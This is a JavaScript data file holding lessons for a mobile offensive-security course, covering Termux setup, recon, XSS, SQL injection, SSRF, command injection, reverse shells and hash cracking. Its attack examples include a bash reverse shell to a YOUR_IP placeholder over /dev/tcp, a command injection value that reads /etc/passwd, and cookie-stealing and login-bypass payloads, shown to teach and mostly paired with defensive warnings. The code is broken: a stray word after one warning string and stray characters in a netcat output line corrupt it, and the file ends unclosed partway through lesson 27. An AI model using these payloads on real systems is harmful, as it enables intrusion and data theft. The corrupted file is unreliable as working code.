/* ================================================================
   NIGHTERS CYBER ACADEMY — lessons-data.js
   All 30 Lessons — 50% Web / 50% System
   ================================================================ */
const LESSONS=[
{id:1,title:"Setting Up Your Arsenal",emoji:"📱",subtitle:"Install Termux and Debian. Get ready for everything.",type:"system",phase:1,month:1,points:50,duration_mins:60,
intro:"Before anything, we need our tools ready. This level sets up Termux and Debian on your phone. If you skip this, nothing else works.",
sections:[
{title:"Install Termux from F-Droid",steps:["Go to f-droid.org on your phone browser","Download and install F-Droid","Open F-Droid and search: Termux","Install Termux from F-Droid (NOT Play Store)","Open Termux and tap Allow for storage"],
cmd:[{t:"c",v:"First command after opening Termux"},{t:"cmd",v:"pkg update && pkg upgrade -y"},{t:"ok",v:"All packages up to date."}],warning:"Never use Termux from Play Store. It is old and broken." Macon},
{title:"Install Debian",steps:["Install proot-distro","Install Debian","Login to Debian","Update Debian"],
cmd:[{t:"cmd",v:"pkg install proot-distro -y"},{t:"ok",v:"proot-distro installed."},{t:"cmd",v:"proot-distro install debian"},{t:"out",v:"Downloading Debian... (5-10 minutes)"},{t:"cmd",v:"proot-distro login debian"},{t:"out",v:"root@localhost:~#"},{t:"cmd",v:"apt update && apt upgrade -y"}],warning:"Every time you open Termux, run: proot-distro login debian to get your Linux environment."}
],
hints:["F-Droid is safe. It is an open source app store.","If download stops halfway, run it again. It will continue."],
quiz:[{q:"Where must you download Termux from?",opts:["Google Play Store","F-Droid","WhatsApp group","Chrome browser"],a:1},{q:"Command to enter Debian?",opts:["login debian","debian open","proot-distro login debian","start debian"],a:2},{q:"Command to update Debian packages?",opts:["pkg update","apt update && apt upgrade -y","update now","linux update"],a:1}],
assignment:{title:"LAB 1 SUBED SETUP",tasks:["Install Termux","Install Debian","Run apt update","Take a screenshot of root@localhost:~#"],submit:"Submit screenshot of Debian prompt to complete your onboarding."}},

{id:2,title:"Linux CLI Fundamentals",emoji:"📟",subtitle:"Master the command line navigation matrix.",type:"system",phase:1,month:1,points:60,duration_mins:45,
intro:"Hackers do not use mice. Everything happens inside the black terminal box. You must learn how to walk through directories using commands.",
sections:[
{title:"Core Navigation Controls",steps:["Check where you are (pwd)","List files (ls)","Make a folder (mkdir)","Change folder (cd)"],
cmd:[{t:"cmd",v:"pwd"},{t:"out",v:"/root"},{t:"cmd",v:"mkdir training && cd training"},{t:"cmd",v:"pwd"},{t:"out",v:"/root/training"}],warning:"Linux is case-sensitive. 'Folder' and 'folder' are different."}
],
hints:["Use 'cd ..' to go back one folder.","Type 'ls -la' to see hidden configurations."],
quiz:[{q:"Which command prints your current working directory?",opts:["whereami","path","pwd","dir"],a:2},{q:"How to move into a directory named 'secrets'?",opts:["go secrets","cd secrets","move secrets","open secrets"],a:1}],
assignment:{title:"CLI OPERATION MAPPING",tasks:["Create folder named 'academy'","Go inside it","Create folder 'level2'","Run pwd and copy output"],submit:"Paste absolute path to /level2 folder."}},

{id:3,title:"HTML5 & Architecture Basics",emoji:"🌐",subtitle:"How web apps display structural targets.",type:"web",phase:1,month:1,points:50,duration_mins:40,
intro:"To hack websites, you must know how they are built. HTML is the bone structure of every target app on the internet.",
sections:[
{title:"Writing Raw Markup Pages",steps:["Create an index.html file","Add basic structural elements","Inject inputs and submit actions"],
cmd:[{t:"cmd",v:"echo '<h1>Target Site</h1><input type=\"text\"><input type=\"submit\">' > index.html"},{t:"ok",v:"HTML element asset written cleanly."}],warning:"Tags must always close, or the layout engine risks rendering faults."}
],
hints:["Input tags capture user parameters. These are primary target insertion coordinates.","Right click -> View Page Source works on any desktop computer browser."],
quiz:[{q:"Which tag creates the biggest heading?",opts:["<h6>","<head>","<h1>","<header>"],a:2},{q:"What element is used to gather parameters or text records?",opts:["<text>","<input>","<div>","<p>"],a:1}],
assignment:{title:"MARKUP SYNTAX DEPLOYMENT",tasks:["Create a file called target.html","Add a header text item","Add a text input element","Submit source output"],submit:"Provide raw text block containing the tags created."}},

{id:4,title:"Network Model Intercepts",emoji:"📡",subtitle:"Understand TCP/IP, ports, and data flow.",type:"system",phase:1,month:1,points:70,duration_mins:50,
intro:"Information traveling through networks is like letters in mail. Ports are apartment numbers. You must map these points.",
sections:[
{title:"Identifying Network Sockets",steps:["Learn standard ports: 80 (HTTP), 443 (HTTPS), 22 (SSH)","Inspect active listener binds"],
cmd:[{t:"c",v:"Check standard port file mapping database lines"},{t:"cmd",v:"cat /etc/services | head -n 20"}],warning:"If a port is already bound, subsequent systems trying to bind it will crash."}
],
hints:["HTTP is unencrypted cleartext. HTTPS uses TLS/SSL protection frameworks.","Ports range from 1 up to 65535 total addresses."],
quiz:[{q:"Standard communication port for cleartext HTTP traffic?",opts:["22","443","80","21"],a:2},{q:"Standard port allocated for Secure Shell (SSH) remote access?",opts:["23","22","80","443"],a:1}],
assignment:{title:"PORT ALLOCATION DOCUMENTATION",tasks:["List standard ports for SSH, HTTP, HTTPS, FTP","Document distinction between TCP and UDP traffic"],submit:"Provide list detailing protocol-to-port maps."}},

{id:5,title:"HTTP Protocol Analysis",emoji:"🔄",subtitle:"Requests, Responses, Headers, and Methods.",type:"web",phase:1,month:1,points:60,duration_mins:45,
intro:"Web clients and servers talk via HTTP requests and responses. Controlling requests lets you control server behavior.",
sections:[
{title:"Analyzing Verb Methods",steps:["GET requests data arrays","POST pushes payloads and variables","Inspect response status codes (200 OK, 404 Missing, 500 Failure)"],
cmd:[{t:"cmd",v:"curl -I https://httpbin.org/status/200"},{t:"out",v:"HTTP/2 200 OK"}],warning:"Tampering with headers alters server tracking variables directly."}
],
hints:["Use curl -v to see both request headers and response envelopes simultaneously.","403 means forbidden, meaning authorization boundary intercept."],
quiz:[{q:"Which HTTP status code signifies resource not found?",opts:["200","500","302","404"],a:3},{q:"Which method passes parameters inside the URL path array?",opts:["POST","GET","PUT","DELETE"],a:1}],
assignment:{title:"HEADER VECTOR TRACING",tasks:["Execute curl tracking on training index","Extract Server configuration header version string"],submit:"Provide server string returned from tracking query."}},

{id:6,title:"Termux Package Customization",emoji:"📦",subtitle:"Installing advanced security tool configurations.",type:"system",phase:1,month:1,points:50,duration_mins:35,
intro:"Base systems are clean slate frameworks. We must install utilities like git, python, curl, and wget to load exploit kits.",
sections:[
{title:"Environment Population",steps:["Install Core Utilities via package manager","Verify python compilation environments work"],
cmd:[{t:"cmd",v:"apt install git python3 curl wget -y"},{t:"ok",v:"Package installation array confirmed functional."}],warning:"Ensure stable network connections during system package synchronizations."}
],
hints:["Always use '-y' flag to bypass execution verification blocks.","python3 --version checks runtime versions."],
quiz:[{q:"Which manager manages assets inside Debian?",opts:["npm","pip","apt","brew"],a:2},{q:"What flag bypasses manual execution check confirmation prompts?",opts:["-q","-y","-force","-all"],a:1}],
assignment:{title:"TOOLKIT VERIFICATION POOL",tasks:["Install core packages","Verify python3 binary mapping","Submit output of python3 --version"],submit:"Paste version string to log environment clearance."}},

{id:7,title:"Network Recon Strategy (Nmap)",emoji:"🔍",subtitle:"Host discovery, port mapping, status validation.",type:"system",phase:1,month:2,points:80,duration_mins:60,
intro:"You cannot strike what you cannot see. Nmap scans target servers to see what software versions are listening on open ports.",
sections:[
{title:"Running Port Discovery Scans",steps:["Install nmap scanning software binary","Scan loopback or target validation host flags"],
cmd:[{t:"cmd",v:"apt install nmap -y"},{t:"cmd",v:"nmap -F scanme.nmap.org"},{t:"out",v:"PORT   STATE SERVICE\n80/tcp open  http"}],warning:"Scanning unauthorized production servers generates alerts in defensive firewall monitors."}
],
hints:["-F runs fast scans over the top 100 common ports only.","-sV detects deep banner software version signatures."],
quiz:[{q:"Primary tactical use-case for Nmap framework?",opts:["Crack hashes","Scan open ports","Inject databases","Bypass authentication"],a:1},{q:"Which flag instructs Nmap to footprint application version headers?",opts:["-F","-sV","-O","-p-"],a:1}],
assignment:{title:"ACTIVE RECON RANGE SCAN",tasks:["Scan scanme.nmap.org using fast configuration parameters","Isolate open service ports"],submit:"List open ports discovered during recon iteration."}},

{id:8,title:"Vulnerability Footprinting",emoji:"🏷",subtitle:"Identify system exposures via version matching.",type:"system",phase:1,month:2,points:70,duration_mins:45,
intro:"Once ports are identified, you must inspect their service banners to see if they match known old, vulnerable code bases.",
sections:[
{title:"Banner Grabbing Operations",steps:["Use netcat or nmap to poll listener service version signatures","Cross-check names against CVE databases"],
cmd:[{t:"cmd",v:"nmap -sV scanme.nmap.org"},{t:"out",v:"Apache httpd 2.4.7 (Ubuntu)"}],warning:"Outdated minor point versions contain public exploitation matrices."}
],
hints:["CVE stands for Common Vulnerabilities and Exposures.","Searchsploit matches local databases against target banners directly."],
quiz:[{q:"What is a CVE?",opts:["Custom Virus Code","Common Vulnerabilities and Exposures","Central Vector Engine","Core Variable Entry"],a:1},{q:"What tool searches local exploit repositories for matching software banners?",opts:["nmap","sqlmap","searchsploit","wireshark"],a:2}],
assignment:{title:"BANNER EXPOSURE TRACKING",tasks:["Identify banner details for a target","Look up exploit frameworks for Apache 2.4.7"],submit:"Document whether public exploits are verified for this version."}},

{id:9,title:"OSINT: Open-Source Intel",emoji:"🕵️",subtitle:"Gather public target leaks and details.",type:"web",phase:1,month:2,points:60,duration_mins:55,
intro:"Hacking begins long before sending packets. OSINT is harvesting information users and companies accidentally post on public networks.",
sections:[
{title:"Automated Passive Gathering",steps:["Install theHarvester search index tool","Scrape target domains for public emails"],
cmd:[{t:"cmd",v:"apt install theharvester -y"},{t:"cmd",v:"theHarvester -d target.com -l 100 -b google"}],warning:"Leaked staff directories yield usernames for target login brute force entries."}
],
hints:["Check Github repositories for accidently committed api secret tokens.","Whois queries show administrative server owner contact data records."],
quiz:[{q:"What does OSINT stand for?",opts:["Open System Intel","Open-Source Intelligence","Offensive Security Integration","Operational Server Tracking"],a:1},{q:"Which platform often accidentally leaks private developer API keys?",opts:["Google Search","GitHub","Wikipedia","Facebook"],a:1}],
assignment:{title:"INTELLIGENCE ANATOMY BUILD",tasks:["Perform a passive whois lookup on a sandbox domain","Extract registrar and name server endpoints"],submit:"Provide administrative nameservers returned."}},

{id:10,title:"Authentication Bypass Vectors",emoji:"🔑",subtitle:"Exploit weak login configuration logic.",type:"web",phase:1,month:2,points:80,duration_mins:50,
intro:"Developers make mistakes. Sometimes they leave default admin passwords or configure logic checks that can be tricked by empty inputs.",
sections:[
{title:"Bypassing Default Constraints",steps:["Locate hidden management portals (/admin, /wp-admin)","Test default vendor credentials (admin:admin, admin:password)"],
cmd:[{t:"c",v:"Testing configuration interface payloads"},{t:"out",v:"Access Granted: Admin Dashboard System Override Active."}],warning:"Change default credentials on all edge devices instantly upon deployment."}
],
hints:["Look up hardware manuals online to find default manufacturer credentials.","Check robots.txt files for paths to hidden login portals."],
quiz:[{q:"Where do developers declare routes they want search bots to ignore?",opts:["index.html","style.css","robots.txt","config.xml"],a:2},{q:"Common administrative combination default credential pairs?",opts:["root:toor","admin:admin","guest:guest","All of the above"],a:3}],
assignment:{title:"PORTAL EXPOSURE MAPS",tasks:["Inspect a sandbox portal directory structural setup","Isolate login interface components"],submit:"Document steps required to lock down open admin gateways."}},

{id:11,title:"DNS Footprinting Vectors",emoji:"🧬",subtitle:"Enumerate subdomains and records.",type:"system",phase:1,month:2,points:70,duration_mins:40,
intro:"A company might secure their primary website but forget a staging, test, or developer portal. Finding subdomains exposes these targets.",
sections:[
{title:"Subdomain Mapping Operations",steps:["Install dnsrecon tracking utilities","Query domain structures for hidden zone pointers"],
cmd:[{t:"cmd",v:"apt install dnsrecon -y"},{t:"cmd",v:"dnsrecon -d target.com"}],warning:"DNS misconfigurations can leak entire corporate network blueprints."}
],
hints:["A records map domains to IPv4 targets. MX points to mail distribution servers.","Subdomain brute forcing steps use wordlists to discover hidden hosts."],
quiz:[{q:"Which record type routes domain routing to IPv4 addresses?",opts:["MX","CNAME","AAAA","A"],a:3},{q:"Tactical purpose of subdomain enumerations?",opts:["Crack user hashes","Find forgotten staging servers","Inject database tables","Crash network links"],a:1}],
assignment:{title:"ZONE RECORDS AUDITING",tasks:["Query public records for an academy sandbox asset","Isolate mail server routing zones"],submit:"Paste MX record values returned from tracking iteration."}},

{id:12,title:"Directory Bruteforcing",emoji:"📂",subtitle:"Find hidden assets, scripts, and logs.",type:"web",phase:1,month:2,points:90,duration_mins:55,
intro:"Websites don't link to their backup or log files. Attackers use directory brute-forcing tools to look for hidden files.",
sections:[
{title:"Fuzzing Directory Contexts",steps:["Install gobuster binary utility","Load a common wordlist asset","Fuzz routes against target paths"],
cmd:[{t:"cmd",v:"apt install gobuster -y"},{t:"cmd",v:"gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt"},{t:"out",v:"/backup.zip (Status: 200)\n/config.php.bak (Status: 200)"}],warning:"Exposed backup archives often hold raw database database root connection keys."}
],
hints:["Wordlists are text files containing thousands of common file and folder names.","Status 200 indicates the resource exists and can be downloaded."],
quiz:[{q:"What does a directory bruteforcer search for?",opts:["Wifi keys","Hidden files and routes","CPU frequencies","Email addresses"],a:1},{q:"What tool performs automated directory route discovery?",opts:["Nmap","Gobuster","Sqlmap","Hydra"],a:1}],
assignment:{title:"FUZZING MATRIX VALIDATION",tasks:["Run fuzzing routing simulation","Isolate matching items yielding status 200 assets"],submit:"List routes uncovered during directory discovery routines."}},

{id:13,title:"Phase 1 Capstone Challenge",emoji:"🎓",subtitle:"Combine all recon vectors to clear Phase 1.",type:"system",phase:1,month:2,points:150,duration_mins:120,
intro:"Time to prove your skills. This exam combines everything you've learned in Phase 1: Linux CLI, Nmap scanning, OSINT, and path fuzzing.",
sections:[
{title:"The Simulation Sandbox Plan",steps:["Map network configurations","Enumerate target asset parameters","Isolate misconfigured entry points"],
cmd:[{t:"c",v:"Consolidated phase challenge operation check"},{t:"ok",v:"Phase 1 Recon Assessment Matrices Fully Met."}],warning:"Ensure zero data data leakage protocols are followed during exercise ranges."}
],
hints:["Review notes regarding Nmap syntax switches and status codes.","Take your time, check your steps carefully."],
quiz:[{q:"Which sequence maps active recon to hidden directory discovery?",opts:["Gobuster then Nmap","Nmap then Gobuster","OSINT then Linux setup","Curl then Git"],a:1},{q:"Standard status return confirming complete file readout authorization?",opts:["403","500","200","404"],a:2}],
assignment:{title:"PHASE 1 AUDIT REPORT",tasks:["Compile consolidated recon steps","Document asset tracking workflow protocols"],submit:"Submit tactical recon summary overview document package."}},

{id:14,title:"Client-Side Parameter Tampering",emoji:"🛠",subtitle:"Manipulate browser checks and parameters.",type:"web",phase:2,month:2,points:80,duration_mins:45,
intro:"Never trust the user. Front-end security rules like maximum length fields can be deleted or altered using browser inspector kits.",
sections:[
{title:"Bypassing DOM Input Rules",steps:["Open target page form inputs","Inspect DOM structures","Remove max, disabled, or read-only validation flags"],
cmd:[{t:"c",v:"Modifying DOM input components manually via console scripts"},{t:"cmd",v:"document.getElementById('price').value = '0.00';"}],warning:"Enforce input checks strictly on backend validation modules."}
],
hints:["Chrome Developer tools open instantly by pressing F12 or right-clicking inspect element.","Hidden fields contain administrative parameters sometimes."],
quiz:[{q:"Where should parameters always be securely checked and validated?",opts:["Client-side browser","Server-side backend","CSS stylesheets","DNS server"],a:1},{q:"Which key generally triggers browser developer interfaces?",opts:["F1","F5","F12","ESC"],a:2}],
assignment:{title:"DOM MANIPULATION LOGICS",tasks:["Locate restricted input elements on local testing script","Modify constraints to pass illegal arguments"],submit:"Document property values modified to circumvent local checks."}},

{id:15,title:"Cross-Site Scripting (XSS)",emoji:"💉",subtitle:"Inject malicious JavaScript into input blocks.",type:"web",phase:2,month:2,points:100,duration_mins:65,
intro:"If an application displays input without sanitizing tags, an attacker can input JavaScript code that executes in another user's browser.",
sections:[
{title:"Reflected XSS Tracing",steps:["Locate echo parameter sinks (search bars, error message wrappers)","Inject active script execution script blocks"],
cmd:[{t:"cmd",v:"<script>alert(document.cookie)</script>"},{t:"out",v:"[Pop-up box displaying private user session token tracking records]"}],warning:"XSS lets attackers steal cookies and hijack sessions."}
],
hints:["Sanitize inputs by escaping specialized characters (<, >, &, \") into HTML entities.","Stored XSS permanently saves payloads inside targeted application databases."],
quiz:[{q:"What executes when an XSS vulnerability is exploited?",opts:["SQL queries","Malicious JavaScript code","Python toolkits","Binary reverse shells"],a:1},{q:"Which variant saves payloads inside persistent storage layers?",opts:["Reflected XSS","Stored XSS","DOM XSS","Blind XSS"],a:1}],
assignment:{title:"PAYLOAD SANITIZATION SCHEMAS",tasks:["Create a script to filter left/right angled bracket elements","Test escaping vectors against script block injections"],submit:"Provide functional backend parsing code string snippet."}},

{id:16,title:"Session Hijacking Operations",emoji:"🍪",subtitle:"Steal and clone session cookie parameters.",type:"web",phase:2,month:2,points:90,duration_mins:50,
intro:"Cookies act like digital badges. If an attacker steals your session cookie badge, they can paste it into their browser to log into your account.",
sections:[
{title:"Cookie Manipulation Intercepts",steps:["Inspect tracking cookies inside Developer Application zones","Clone parameters into an unauthenticated browser instance"],
cmd:[{t:"c",v:"Session value inject scripts"},{t:"cmd",v:"document.cookie = 'session_id=STOLEN_TOKEN_HEX';"}],warning:"Protect cookies with Secure, HttpOnly, and SameSite validation attribute parameters."}
],
hints:["HttpOnly prevents JavaScript scripts from reaching cookies, stopping XSS session theft.","Secure attribute ensures cookies travel over encrypted channels only."],
quiz:[{q:"Which flag blocks JavaScript access to cookies?",opts:["Secure","HttpOnly","SameSite","Private"],a:1},{q:"What happens when session cookies are hijacked?",opts:["Server crashes","Attacker logs into account without credentials","Database gets wiped","DNS settings change"],a:1}],
assignment:{title:"COOKIE CONTROL FRAMEWORKS",tasks:["Analyze cookie attribute configurations on test targets","Isolate exposure risks when flags are omitted"],submit:"Provide recommended configuration declarations for cookie outputs."}},

{id:17,title:"Netcat Tactical Networking",emoji:"🐱",subtitle:"Bind shells, reverse connections, data pipes.",type:"system",phase:2,month:2,points:100,duration_mins:60,
intro:"Netcat is the swiss army knife of hackers. It reads and writes data across network connections using TCP or UDP.",
sections:[
{title:"Setting Up Connection Listeners",steps:["Open active listening port parameters on system","Connect from secondary shell matrix to transmit parameters"],
cmd:[{t:"cmd",v:"nc -lvnp 4444"},{t:"out",v:"Listening on [0.0.0.0] (優先 port 4444)..."},{t:"cmd",v:"nc 127.0.0.1 4444"}],warning:"Unprotected listening ports allow unauthorized network entities to link to internal systems."}
],
hints:["-l listens, -v gives detailed output, -n skips DNS lookups, -p defines port targets.","Netcat can transfer files across network segments."],
quiz:[{q:"Which flag sets Netcat to incoming listening status?",opts:["-e","-l","-s","-k"],a:1},{q:"Why add -n to netcat configuration rules?",opts:["Disable styling","Skip DNS lookups for faster connection","Force UDP mode","Execute shell binaries"],a:1}],
assignment:{title:"DATA PIPELINE DEPLOYMENT",tasks:["Establish a netcat listener on an isolated terminal instance","Pipe test data vectors across boundaries cleanly"],submit:"Provide command parameters utilized for data listener setups."}},

{id:18,title:"Command Injection Sinks",emoji:"💥",subtitle:"Hijack backend server OS system processes.",type:"system",phase:2,month:3,points:110,duration_mins:70,
intro:"When web applications pass raw user strings directly into system commands, an attacker can append command shell delimiters to run arbitrary server actions.",
sections:[
{title:"Exploiting Concatenation Bugs",steps:["Locate features passing arguments directly to system utilities (e.g. ping utility diagnostic forms)","Append operational line execution breaks (; , && , ||) followed by arbitrary shell payloads"],
cmd:[{t:"cmd",v:"8.8.8.8 ; cat /etc/passwd"},{t:"out",v:"PING 8.8.8.8\nroot:x:0:0:root:/root:/bin/bash"}],warning:"Never pass raw inputs into system execution wrappers like exec() or system()."}
],
hints:["Sanitize inputs using whitelist parameter checks before execution routines.","Blind command injection doesn't display text output, needing sleep delays to verify execution."],
quiz:[{q:"Which character can chain multiple Linux commands in sequence?",opts:["<",">",";","_"],a:2},{q:"How to safely prevent process execution injections?",opts:["Use basic regex","Avoid passing raw variables into system shell utilities","Hide input elements","Block specific characters"],a:1}],
assignment:{title:"PROCESS MATRIX REFACTOR",tasks:["Analyze vulnerable code snippet passing input directly to execution functions","Rewrite logic using hard validation arrays"],submit:"Provide refactored secure script snippet."}},

{id:19,title:"Reverse Shell Engineering",emoji:"🐚",subtitle:"Establish outbound control pipelines.",type:"system",phase:2,month:3,points:120,duration_mins:75,
intro:"Firewalls stop incoming connections, but allow outgoing ones. A reverse shell makes the target connect back to your listening terminal.",
sections:[
{title:"Spawning Remote Access Intercepts",steps:["Initialize Netcat listener on your machine","Execute outbound shell code from target system back to listener IP"],
cmd:[{t:"cmd",v:"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"},{t:"out",v:"Connection received! root@target:~#"}],warning:"Reverse shells give full terminal power over the exploited host target."}
],
hints:["Check Pentestmonkey reverse shell cheat sheets for alternative language payloads (Python, PHP, Perl).","Ensure firewall rules accept incoming traffic on chosen port slots."],
quiz:[{q:"Why are reverse shells preferred over bind shells?",opts:["They run faster","They bypass inbound firewall blocks by connecting outbound","They require no open ports","They use encrypted pipes"],a:1},{q:"Which utility captures incoming connection streams?",opts:["Nmap","Gobuster","Netcat","Sqlmap"],a:2}],
assignment:{title:"SHELL CODE DOCUMENTATION",tasks:["Generate basic reverse shell command line string configurations","Document execution parameters"],submit:"Provide operational string payload template."}},

{id:20,title:"Log Auditing & Footprints",emoji:"📜",subtitle:"Locate, inspect, and analyze service tracks.",type:"system",phase:2,month:3,points:80,duration_mins:50,
intro:"Every action leaves a trace. To be a red team operator, you must know how defensive teams look at system logs to detect exploitation traffic.",
sections:[
{title:"Analyzing Track Profiles",steps:["Navigate into centralized log directory pathways (/var/log)","Inspect access records for anomalies"],
cmd:[{t:"cmd",v:"tail -n 20 /var/log/nginx/access.log"},{t:"out",v:"127.0.0.1 - - [2026] \"GET /admin HTTP/1.1\" 200"}],warning:"Clearing or tempering log files without explicit authorization breaks system tracing tracks."}
],
hints:["auth.log captures login and privilege scaling actions inside Debian environments.","grep searches text patterns out of complex log listings."],
quiz:[{q:"Centralized home path directory for system logs?",opts:["/etc","/var/log","/usr/bin","/root"],a:1},{q:"What command filters lines out of file tracks based on text conditions?",opts:["cat","ls","grep","find"],a:2}],
assignment:{title:"TRACK TRACKING EXERCISES",tasks:["Locate service log indices inside test environments","Filter lines containing request errors"],submit:"Provide command chains applied to extract target log strings."}},

{id:21,title:"SQL Injection Vectors (SQLi)",emoji:"🗄️",subtitle:"Extract database parameters via input fields.",type:"web",phase:2,month:3,points:110,duration_mins:70,
intro:"If an input parameter maps directly into raw database database queries, an attacker can break query context to access sensitive data stores.",
sections:[
{title:"Manual Syntax Testing",steps:["Input escape operators (') into field prompts","Observe syntax compile errors indicating weak sanitization"],
cmd:[{t:"cmd",v:"' OR 1=1 --"},{t:"out",v:"Welcome admin! Access confirmed."}],warning:"Parameterized prepared statements isolate variable values from command execution paths completely."}
],
hints:["The double dash (--) comments out the remainder of the active SQL tracking string context inside backends.","Automate massive validation testing via the sqlmap system utility."],
quiz:[{q:"What fixes SQL injection vulnerabilities permanently?",opts:["JavaScript size limits","Prepared statements with parameterized queries","Hidden inputs","Firewall rules"],a:1},{q:"What does SQLi extract?",opts:["Router configurations","Unauthorized database tables and records","Browser keys","CPU allocations"],a:1}],
assignment:{title:"INJECTION BOUNDARY MAPPING",tasks:["Trace parameter behavior when query context boundaries are pushed","Inject validation constraints on variable types"],submit:"Provide defensive logic declaration preventing query injections."}},

{id:22,title:"Phase 2 Consolidation",emoji:"🛡️",subtitle:"Execute complete exploit chains on targets.",type:"web",phase:2,month:3,points:160,duration_mins:150,
intro:"Phase 2 focus wraps up now. You must demonstrate how parameter control chains step-by-step into shell execution parameters across test targets.",
sections:[
{title:"Integrated Attack Vectors",steps:["Isolate code vulnerabilities via systematic tracing","Deploy functional exploitation payloads","Capture system execution responses"],
cmd:[{t:"c",v:"Validating full stack exploit progression pipeline scripts"},{t:"ok",v:"Exploit Loop Closed and Verified Dynamic Access Verified."}],warning:"Always verify targets match scope definitions prior to dispatch loops."}
],
hints:["Re-verify structural data handling tracks inside your system parameters.","Break down vectors methodically; link outputs from step A into step B input spaces."],
quiz:[{q:"Linking XSS data captures directly into unauthorized session hijacking steps represents?",opts:["Scanning","An exploit chain","Passive intelligence gathering","Patch installation"],a:1},{q:"Primary asset sought during remote terminal exploitations?",opts:["System fonts","Target command line interface access shell","HTML design layouts","DNS domain maps"],a:2}],
assignment:{title:"CONSOLIDATED ANALYSIS SCHEMAS",tasks:["Map exploitation vectors across simulated environment modules","Document root root cause defects"],submit:"Provide operational summary reports covering the exploit vectors applied."}},

{id:23,title:"Automated Credential Testing",emoji:"🔨",subtitle:"Brute-force login screens via Hydra.",type:"system",phase:3,month:3,points:100,duration_mins:55,
intro:"When users pick weak passwords, brute force tools can crack accounts by testing thousands of common words in seconds.",
sections:[
{title:"Dictionary Spraying Operations",steps:["Install hydra execution engine","Load password directory dictionary assets","Execute login attack loops against test servers"],
cmd:[{t:"cmd",v:"apt install hydra -y"},{t:"cmd",v:"hydra -l admin -P passwords.txt 127.0.0.1 ssh"},{t:"out",v:"[22][ssh] host: 127.0.0.1 login: admin password: superpassword123"}],warning:"Account lockout rules block brute force attempts after a few wrong guesses."}
],
hints:["Rockyou.txt is the world's most famous password file containing millions of real leaked passwords.","Use -l for a single user, -L for a list of users."],
quiz:[{q:"What tool automates high-speed parallel service password spraying?",opts:["Nmap","Gobuster","Hydra","Sqlmap"],a:2},{q:"Best defense against dictionary spraying attacks?",opts:["Long complex names","Account lockouts and multi-factor authorization","Hide input elements","CSS modifications"],a:1}],
assignment:{title:"BRUTE DISCOVERY LOGICS",tasks:["Simulate a brute force pass matching target parameters","Establish tracking rules for authorization failures"],submit:"Provide configuration parameters used to deploy automated validation loops."}},

{id:24,title:"SQLMap Automation",emoji:"🤖",subtitle:"Automate database maps and extractions.",type:"web",phase:3,month:3,points:120,duration_mins:65,
intro:"Manually extracting database tables is slow. SQLMap automates finding and exploiting SQL injections, letting you dump entire databases with one command.",
sections:[
{title:"Automated Database Extractions",steps:["Isolate target parameters with known injection points","Run sqlmap to map schema outlines","Dump internal user data structures"],
cmd:[{t:"cmd",v:"apt install sqlmap -y"},{t:"cmd",v:"sqlmap -u \"http://target.com/item.php?id=1\" --dbs"},{t:"out",v:"available databases [2]:\n[*] information_schema\n[*] web_users"}],warning:"Running SQLMap without data limit constraints can flood databases and crash servers."}
],
hints:["--dbs dumps database names, --tables dumps table fields, --dump extracts data lines.","Use the --batch switch to automatically accept default prompts during execution."],
quiz:[{q:"Which option tells SQLMap to extract all available databases?",opts:["--all","--dbs","-get-data","--tables"],a:1},{q:"What makes SQLMap highly dangerous to production targets?",opts:["It modifies styles","It can run hundreds of aggressive automated tracking queries quickly","It deletes local assets","It alters system paths"],a:1}],
assignment:{title:"AUTOMATION AUDIT TRACES",tasks:["Execute target parameter tracking verification routines","Isolate system database table signatures"],submit:"List databases mapped from automated tracing outputs."}},

{id:25,title:"Server-Side Request Forgery",emoji:"🎯",subtitle:"Trick servers into attacking internal networks.",type:"web",phase:3,month:3,points:130,duration_mins:75,
intro:"SSRF lets an attacker trick a server into sending requests to internal systems that are hidden from the public internet.",
sections:[
{title:"Exploiting Internal Routing Links",steps:["Locate features fetching remote image or url resources","Alter destination targets to point to internal network endpoints or loopback systems"],
cmd:[{t:"cmd",v:"http://target.com/fetch?url=http://127.0.0.1:8080/admin_panel"},{t:"out",v:"Loading internal infrastructure management dashboard..."}],warning:"Sanitize URL paths using strict IP destination block checklists."}
],
hints:["Loopback addresses point directly back to localhost host blocks (127.0.0.1).","Cloud metadata interfaces contain administrative secret tokens accessible via SSRF vectors inside cloud providers."],
quiz:[{q:"What target is typically targeted during SSRF exploitations?",opts:["Client browser","Internal infrastructure hidden from public routes","DNS server","Static CSS files"],a:1},{q:"Loopback IP address pointing back to the current server system?",opts:["192.168.1.1","10.0.0.1","127.0.0.1","8.8.8.8"],a:2}],
assignment:{title:"ROUTING DEFENSE CONSTRAINTS",tasks:["Trace parameter behaviors routing external assets","Implement IP access white lists on request gateways"],submit:"Provide secure code snippet handling resource routing validations safely."}},

{id:26,title:"Password Hash Cracking",emoji:"💥",subtitle:"Crack cryptographic string passwords offline.",type:"system",phase:3,month:3,points:110,duration_mins:60,
intro:"Databases don't save plaintext passwords; they save cryptographic hashes. Attackers dump these hashes and crack them offline using hash cracking tools.",
sections:[
{title:"Decrypting Hash Structures",steps:["Isolate hash algorithms (MD5, SHA-1, bcrypt)","Run John the Ripper or Hashcat dictionary matches against targets"],
cmd:[{t:"cmd",v:"echo '827ccb0eea8a706c4c34a16891f84e7b' > hash.txt"},{t:"cmd",v:"john --format=raw-md5 hash.txt"},{t:"out",v:"12345\n1 password cracked successfully."}],warning:"Bcrypt and Argon2 utilize salt algorithms to stop high speed dictionary matching operations."}
],
hints:["Salting appends unique string characters to inputs before hashing, making rainbow tables useless.","Identify hash patterns using online analyzers or tool flags."],
quiz:[{q:"Which hash format is completely un-salted and considered broken?",opts:["Bcrypt","MD5","Argon2","SHA-256 with salt"],a:1},{q:"What tool cracks password hashes offline?",opts:["John the Ripper","Nmap","Gobuster","Hydra"],a:0}],
assignment:{title:"OFFLINE CRYPTOGRAPHY ANALYSIS",tasks:["Isolate standard hash signature blocks","Run local dictionary verification attempts against test items"],submit:"Provide cleartext output of successfully cracked string verification records."}},

{id:27,title:"Steganography & Metadata",emoji:"🖼️",subtitle:"Extract hidden parameters out of file assets.",type:"system",phase:3,month:3,points:90,duration_mins:45,
intro:"Files contain hidden details. Images store coordinates where they were taken. Steganography is hiding secrets inside normal files.",
sections:[
{title:"Extracting Hidden File Metadata",steps:["Install extraction utilities like exiftool and binwalk","Scan image and media assets for appended file segments"],
cmd:[{t:"cmd",v:"apt install exiftool binwalk steghide -y"},{t:"cmd",v:"exiftool target.jpg"},{t:"out",v:"GPS Position : 6°27'14\" N 3°23'45\" E"}],warning:"Scrub photo metadata completely before publishing items onto public platforms."}
],
